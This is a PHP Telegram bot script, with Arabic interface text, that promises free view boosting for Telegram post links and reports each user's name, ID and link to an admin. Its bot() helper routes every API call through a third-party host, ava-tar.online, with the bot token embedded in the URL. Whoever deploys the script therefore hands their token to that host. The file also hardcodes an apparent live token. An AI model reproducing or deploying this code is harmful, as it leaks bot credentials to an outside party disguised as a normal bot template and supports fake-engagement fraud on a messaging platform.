<?php
ob_start();
$API_KEY = '1764819212:AAGvzfvV0wjj2M2mnwopVBkCBBN5GBp0-pI'; /* توكن البوت*/
define('API_KEY',$API_KEY);
function bot($method,$webhook=[]){
$webhook = http_build_query($webhook);
$url ="https://ava-tar.online/api/kro/jack.php/E_G_Y_0".API_KEY."/".$method."?$webhook";
$webhook = file_get_contents($url);
return json_decode($webhook);}
$update = json_decode(file_get_contents('php://input'));
if($update->message){
$message = $update->message;
$message_id = $update->message->message_id;
$chat_id = $message->chat->id;
$text = $message->text;
$name1 = $message->from->first_name;
$name2 = $message->from->last_name;
$from_id = $message->from->id;
}
if($update->callback_query){
$chat_id = $update->callback_query->message->chat->id;
$message_id = $update->callback_query->message->message_id;
$name1 = $update->callback_query->message->chat->first_name;
$name2 = $update->callback_query->message->chat->last_name;
$from_id = $update->callback_query->from->id;
}

$admin = "1965297568"; ## ايدي الادمن
if(preg_match("#t.me#",$text)){
$api1 = json_decode(file_get_contents("https://ava-tar.online/api/kro?jack=".$text),1);
$get_api1 = $api1["text"];
bot('sendmessage',[
'chat_id'=>$chat_id,
'reply_to_message_id'=>$message_id, 
"text" =>"*".$get_api1."*",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"𝙿𝙷𝙿",'url'=>"https://t.me/E_G_Y_0"]],
]])]);
bot('sendmessage',[
'chat_id'=>$admin,
'reply_to_message_id'=>$message_id, 
"text" =>"* ❍ عزيزي الادمن عمليه رشق جديده
❍ إسم المستخدم :* `".$name1.$name2."`
*❍ الأيدي :* `".$chat_id."`
*❍ قام برشق :* `".$text."`
*❍ النتيجه :* `".$get_api1."`",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"𝙿𝙷𝙿",'url'=>"https://t.me/E_G_Y_0"]],
]])]);
}else{
bot('sendmessage',[
'chat_id'=>$chat_id,
'reply_to_message_id'=>$message_id,
"text" => "*❍ اهلا بك ".$name1.$name2." في بوت رشق مشاهدات مجانيه .
❍ ارسل رابط منشور بصوره صحيحه .*",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"𝙿𝙷𝙿",'url'=>"https://t.me/E_G_Y_0"]],
[['text'=>"𝙹𝙰𝙲𝙺",'url'=>"https://t.me/V_P_E"]],]])]);
}


echo "➖➖➖➖➖➖➖➖➖➖
🌎 𝚃𝙷𝙴 𝙵𝙸𝙻𝙴 𝚆𝙰𝚂 𝚆𝚁𝙸𝚃𝚃𝙴𝙽 𝙱𝚈: @V_P_E 
➖➖➖➖➖➖➖➖➖➖
🌎 𝙵𝙾𝙻𝙻𝙾𝚆 𝚄𝚂: @E_G_Y_0 
➖➖➖➖➖➖➖➖➖➖
👁 𝙿𝙰𝚁𝚃𝙸𝙲𝙸𝙿𝙰𝚃𝙸𝙾𝙽 𝙸𝚂 𝙰𝙻𝙻𝙾𝚆𝙴𝙳 𝙰𝙽𝙳 𝙳𝙾 𝙽𝙾𝚃 𝚃𝙰𝙼𝙿𝙴𝚁 𝚆𝙸𝚃𝙷 𝙼𝚈 𝚁𝙸𝙶𝙷𝚃𝚂
➖➖➖➖➖➖➖➖➖➖";